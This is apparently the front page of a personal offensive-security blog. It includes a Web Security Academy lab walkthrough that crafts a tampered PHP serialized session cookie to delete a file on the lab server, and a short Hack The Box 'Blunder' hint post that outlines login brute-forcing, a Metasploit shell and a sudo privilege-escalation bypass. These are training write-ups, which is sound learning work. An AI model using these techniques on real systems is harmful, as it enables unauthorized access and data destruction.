<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Grey Zone</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Offsec, Game Design and More">
<meta property="og:type" content="website">
<meta property="og:title" content="Grey Zone">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Grey Zone">
<meta property="og:description" content="Offsec, Game Design and More">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Grey Deng">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Grey Zone" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Grey Zone</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Offsec, Game Design and More</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Web-Security-Academy-SQL-Injection-1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/07/08/Web-Security-Academy-SQL-Injection-1/" class="article-date">
  <time datetime="2020-07-08T07:05:41.000Z" itemprop="datePublished">2020-07-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/08/Web-Security-Academy-SQL-Injection-1/">[Web Security Academy] SQL Injection (1)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/07/08/Web-Security-Academy-SQL-Injection-1/" data-id="ckcd0sn9e0000lwutcx7wap2m" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Offsec/" rel="tag">Offsec</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-Security-Academy/" rel="tag">Web_Security_Academy</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Web-Security-Academy-Java-deserialization" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/07/07/Web-Security-Academy-Java-deserialization/" class="article-date">
  <time datetime="2020-07-07T08:09:35.000Z" itemprop="datePublished">2020-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/07/Web-Security-Academy-Java-deserialization/">[Web Security Academy] Insecure Deserialization (1)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>(Lab 1 and 2 are skipped because the contents are easy. The main purpose for this practice is to prepare myself for OSWE exam.)</p>
<h1 id="Lab-3-Using-application-functionality-to-exploit-insecure-deserialization"><a href="#Lab-3-Using-application-functionality-to-exploit-insecure-deserialization" class="headerlink" title="Lab 3: Using application functionality to exploit insecure deserialization"></a>Lab 3: Using application functionality to exploit insecure deserialization</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&#39;s home directory.</span><br><span class="line">You can access your own account using the following credentials: wiener:peter</span><br><span class="line">You also have access to a backup account: gregg:rosebud</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol>
<li><p>Notice that “My Account” Page Cookie after login:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: session&#x3D;Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJOWDVsc21ucVI5TWZTb2wwQVZIRTRRbU40R3lsYW9yZSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d</span><br></pre></td></tr></table></figure>
</li>
<li><p>Decode the base64 cookie:</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;NX5lsmnqR9MfSol0AVHE4QmN4Gylaore&quot;;s:11:&quot;avatar_link&quot;;s:19:&quot;users&#x2F;wiener&#x2F;avatar&quot;O30%3d</span><br></pre></td></tr></table></figure>

<p>Take note that <strong>avatar_link</strong> is referred in the cookie. Meanwhile, <strong>Delete Account</strong> button sends a post request to delete the current account. To delete the morale.txt file from Carlo’s home directory, it is clear that crafting the cookie and delete the account is one possible way.</p>
<ol start="3">
<li>Craft the cookie:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;gregg&quot;;s:12:&quot;access_token&quot;;s:32:&quot;OsTWRNgOgwIgdfjwDk6SgFT5iKZTbHx8&quot;;s:11:&quot;avatar_link&quot;;**s:23:&quot;&#x2F;home&#x2F;carlos&#x2F;morale.txt&quot;**;&#125;</span><br></pre></td></tr></table></figure>

<p>Encode it with base64:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Ik9zVFdSTmdPZ3dJZ2RmandEazZTZ0ZUNWlLWlRiSHg4IjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30&#x3D;</span><br></pre></td></tr></table></figure></p>
<ol start="4">
<li>Replace the cookie with the crafted one when delete the account.</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/07/07/Web-Security-Academy-Java-deserialization/" data-id="ckcd03koz0000goutf3cq5dci" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Offsec/" rel="tag">Offsec</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-Security-Academy/" rel="tag">Web_Security_Academy</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-HTB-Walkthrough-Blunder" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/07/04/HTB-Walkthrough-Blunder/" class="article-date">
  <time datetime="2020-07-04T03:31:04.000Z" itemprop="datePublished">2020-07-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/04/HTB-Walkthrough-Blunder/">[HTB Hints] Blunder</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>Target is a Linux machine with IP: 10.10.10.191. Nmap shows that port 80 is the only open port. Dirbuster on target:</p>
<ol>
<li>login panel (/admin)</li>
<li>todos (to-do.txt)</li>
<li>other content pages</li>
</ol>
<p>The login page can be brute-forced through a crafted wordlist, with the username “furges” from to-do and wordlist built from web page.</p>
<h1 id="www-data"><a href="#www-data" class="headerlink" title="www-data"></a>www-data</h1><p>After obtain the web login information, a <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec" target="_blank" rel="noopener">bludit metasploit module</a> can be used to obtain www-data shell</p>
<h1 id="user"><a href="#user" class="headerlink" title="user"></a>user</h1><p>Examine the web server source code, and the password hash for normal user is there. Dehash with any online tools or jack. A simple <strong>su</strong> command can be used to obtain user.</p>
<h1 id="root"><a href="#root" class="headerlink" title="root"></a>root</h1><p>User to root is an exploit I never heard before. A <strong>sudo -l</strong> command shows privilege for user, and further exploits can be find <a href="https://www.hackingarticles.in/sudo-security-policy-bypass-vulnerability-cve-2019-14287/" target="_blank" rel="noopener">here</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/07/04/HTB-Walkthrough-Blunder/" data-id="ckc73bb830001vout0c491pu1" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Offsec/" rel="tag">Offsec</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/07/04/hello-world/" class="article-date">
  <time datetime="2020-07-04T03:19:38.742Z" itemprop="datePublished">2020-07-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/04/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/07/04/hello-world/" data-id="ckc73bb7z0000voutcf0zeda5" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Offsec/" rel="tag">Offsec</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Security-Academy/" rel="tag">Web_Security_Academy</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/HTB/" style="font-size: 10px;">HTB</a> <a href="/tags/Offsec/" style="font-size: 20px;">Offsec</a> <a href="/tags/Web-Security-Academy/" style="font-size: 15px;">Web_Security_Academy</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/07/08/Web-Security-Academy-SQL-Injection-1/">[Web Security Academy] SQL Injection (1)</a>
          </li>
        
          <li>
            <a href="/2020/07/07/Web-Security-Academy-Java-deserialization/">[Web Security Academy] Insecure Deserialization (1)</a>
          </li>
        
          <li>
            <a href="/2020/07/04/HTB-Walkthrough-Blunder/">[HTB Hints] Blunder</a>
          </li>
        
          <li>
            <a href="/2020/07/04/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 Grey Deng<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>